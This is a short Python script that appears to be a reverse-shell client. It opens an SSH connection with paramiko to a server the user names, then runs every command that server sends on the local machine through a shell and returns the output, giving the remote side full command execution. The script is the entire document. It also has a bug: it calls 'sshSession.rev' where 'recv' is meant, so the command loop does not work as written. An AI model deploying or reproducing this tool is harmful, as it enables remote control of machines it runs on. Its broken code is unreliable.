import getpass
import paramiko
import shlex
import subprocess
import sys


def ssh_connect (user, ssh_password, host, ssh_port, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    client.connect(host, port=ssh_port, username=user, password=ssh_password)

    sshSession = client.get_transport().open_session()

    if sshSession:
        sshSession.send(command)
        print(sshSession.recv(1024).decode())

        while True:
            command = sshSession.rev(1024).decode()
            try:
                if(command == "exit"):
                    client.close()
                    break

                output = subprocess.check_output(shlex.split(command), shell=True)

                sshSession.send(output or "done")

            except Exception as e:
                sshSession.send(str(e))


def main():
    if len(sys.argv) != 4:
        print(f"Usage:\t\tpython {sys.argv[0]} <user> <host/ip of server> <port>")
        print(f"Example:\tpython {sys.argv[0]} root 127.0.0.1 22")
        sys.exit()

    user = sys.argv[1]
    password = getpass.getpass()
    host = sys.argv[2]
    port = sys.argv[3]

    ssh_connect(user, password, host, port, "Client Connected")

if __name__ == "__main__":
    main()